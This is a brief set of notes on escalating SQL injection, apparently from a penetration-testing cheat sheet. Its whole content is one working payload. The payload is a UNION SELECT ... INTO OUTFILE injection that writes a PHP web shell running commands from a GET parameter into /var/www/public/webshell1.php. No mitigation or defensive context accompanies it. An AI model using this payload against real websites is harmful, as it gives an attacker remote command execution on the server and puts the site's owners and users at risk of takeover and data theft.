### SQLi Notes 

* Escalating SQLi beyond data:
  - Example of file writing for a web shell (if permissions allow):
  
```search=all'+union+select+"", "", '<?php system($_GET[0]);?>', "", "", "" into outfile '/var/www/public/webshell1.php'--+--```
